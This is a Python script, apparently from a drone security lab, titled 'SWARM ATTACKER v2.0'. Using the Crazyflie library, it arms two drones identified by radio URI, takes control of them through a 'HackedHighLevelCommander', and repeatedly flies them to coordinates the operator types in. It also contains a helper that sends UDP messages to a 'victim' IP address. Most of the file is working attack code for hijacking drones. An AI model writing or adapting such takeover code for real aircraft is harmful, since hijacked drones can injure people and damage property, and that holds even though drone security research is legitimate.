import time
import logging
import signal
import sys
import socket
import json
from datetime import datetime
from cflib.crazyflie import Crazyflie
from cflib import crtp
from cflib.crazyflie.swarm import Swarm, CachedCfFactory
from cflib.crazyflie.log import LogConfig
import cflib.crtp

logging.basicConfig(level=logging.INFO)

# ==================== SWARM CONFIGURATION ====================
# Target swarm URIs (SAME CHANNEL - 80)
SWARM_URIS = {
    "radio://1/80/2M/E7E7E7E7E9",  # Drone 1
    "radio://1/80/2M/E7E7E7E7E8"  # Drone 2
}

# Network configuration for victim communication
VICTIM_IP = "172.16.151.168" 
VICTIM_PORT = 9999

# Global containers for swarm control
swarm = None
commanders = {}  # uri -> HackedHighLevelCommander
position_loggers = {}

# ==================== SWARM CALLBACK PATTERN ====================
def takeoff_all(scf):
    """Arm and takeoff for a single drone in the swarm"""
    uri = scf.cf.link_uri
    print(f"[SWARM] {uri}: Arming and taking over control...")
    
    try:
        # Arm the drone
        scf.cf.platform.send_arming_request(True)
        time.sleep(0.5)
        
        # Create hacked commander for this drone
        from cflib.crazyflie.high_level_commander import HackedHighLevelCommander
        commander = HackedHighLevelCommander(scf.cf)
        commanders[uri] = commander
        
        print(f"[SWARM] {uri}: Takeover successful, commander ready")
        return True
    except Exception as e:
        print(f"[SWARM] {uri}: Takeover failed - {e}")
        return False

def attack_sequence(scf, target_x,target_y,max_attempts=15):
    """Execute attack sequence on a single drone"""
    uri = scf.cf.link_uri
    cof=1
    if uri=="radio://1/80/2M/E7E7E7E7E8":
        cof=-1
    #target_x=swarm_paths[0]
    #target_y=swarm_paths[1]
    #max_attempts=swarm_paths[2]

    #from high_level_commander import HackedHighLevelCommander
    from cflib.crazyflie.high_level_commander import HackedHighLevelCommander
   
    uri = scf.cf.link_uri
    commander = HackedHighLevelCommander(scf.cf)
    time.sleep(2)

    
    if not commander:
        print(f"[ATTACK] {uri}: No commander available, skipping")
        return
    
    print(f"\n[ATTACK] {uri}: Starting attack sequence to ({target_x:.2f}, {target_y:.2f})")
    
    # Record attack start time for metrics
    attack_start = time.time()
    
    # Send multiple go_to commands (5-6 attempts)
    for attempt in range(1, max_attempts + 1):
        print(f"[ATTACK] {uri}: Attempt {attempt}/{max_attempts}")
        
        # Shorter duration for later attempts (like your original code)
        duration = 3.0 if attempt > 1 else 5.0
        
        # Send the malicious go_to command

        commander.go_to(target_x, target_y, 1.0, 0, duration)
        
        # Wait for movement
        time.sleep(duration + 1.0)
        
        # Send attack signal to victim after first attempt
        if attempt >= 2:
            #send_victim_signal(f"ATTACK_{uri[-4:]}")
            pass
    
    # Land the drone
    print(f"[ATTACK] {uri}: Landing...")
    commander.land(0.0, 4.0)
    time.sleep(4.0)
    
    # Record metrics
    attack_duration = time.time() - attack_start
    print(f"[METRICS] {uri}: Attack completed in {attack_duration:.2f}s with {max_attempts} attempts")

def land_all(scf):
    """Safety land a single drone"""
    uri = scf.cf.link_uri
    commander = commanders.get(uri)
    
    if commander:
        print(f"[SAFETY] {uri}: Emergency landing")
        commander.land(0.0, 3.0)
        time.sleep(3.0)
def arm(scf):
    scf.cf.platform.send_arming_request(True)
    time.sleep(1.0)

# ==================== SWARM CONTROL FUNCTIONS ====================
def run_swarm_attack():
    """Main swarm attack execution"""
    global swarm
    
    print("\n" + "="*60)
    print("SWARM ATTACK CONTROLLER - SIMULTANEOUS TAKEOVER")
    print("="*60)
    
    # Get target coordinates from user
    print("\nSpecify attack coordinates for ALL drones:")
    target_x = float(input("Enter X coordinate (meters): "))
    target_y = float(input("Enter Y coordinate (meters): "))
    
    print(f"\n🎯 Target coordinates set: ({target_x:.2f}, {target_y:.2f})")
    print(f"📡 Attacking {len(SWARM_URIS)} drones on channel 80")
    
    # Initialize the swarm with parallel connection support
    #factory = CachedCfFactory(rw_cache='./cache')
    #swarm = Swarm(SWARM_URIS, factory=factory)
    
    swarm_paths = {
        "radio://1/80/2M/E7E7E7E7E9":[target_x,target_y,15],
        "radio://1/80/2M/E7E7E7E7E8":[(-1)*target_x,target_y,15] 
    }



    #uris = ["radio://1/80/2M/E7E7E7E7E9", "radio://1/80/2M/E7E7E7E7E8"]
    cflib.crtp.init_drivers()
    factory = CachedCfFactory(rw_cache='./cache')
    with Swarm(SWARM_URIS, factory=factory) as swarm:
        swarm.reset_estimators()
        swarm.parallel_safe(arm)
        swarm.parallel_safe(attack_sequence,args_dict=swarm_paths)
        print("landing...")
        swarm.parallel_safe(land_all)


    # Send initial signal to victim
    #send_victim_signal("SWARM_ATTACK_INITIATED")
    
    
    
        # Clean shutdown
    #send_victim_signal("ATTACKER_READY")
        
        
   #swarm.close_links()
   #print("All connections closed")

# ==================== ORIGINAL HELPER FUNCTIONS (ADAPTED) ====================
def send_victim_signal(message):
    """Send a signal to the victim computer"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(message.encode(), (VICTIM_IP, VICTIM_PORT))
        print(f"[SIGNAL] Sent to victim: {message}")
        sock.close()
        return True
    except Exception as e:
        print(f"[SIGNAL] Failed to send: {e}")
        return False

def emergency_stop(sig=None, frame=None):
    """Emergency stop function"""
    print("\n🛑 EMERGENCY STOP TRIGGERED!")
    
    if swarm:
        swarm.parallel_safe(land_all)
        time.sleep(3)
        swarm.close_links()
    
    #send_victim_signal("EMERGENCY_STOP")
    sys.exit(0)

# ==================== MAIN EXECUTION ====================
if __name__ == "__main__":
    print("SWARM ATTACKER v2.0 - Simultaneous Multi-Drone Takeover")
    print("="*60)
    print(f"Target Drones: {', '.join(SWARM_URIS)}")
    print("="*60)
    print("⚠  Press Ctrl+C for emergency stop")
    
    # Register emergency handler
    signal.signal(signal.SIGINT, emergency_stop)
    
    # Initialize drivers and run attack
    #crtp.init_drivers()
    run_swarm_attack()
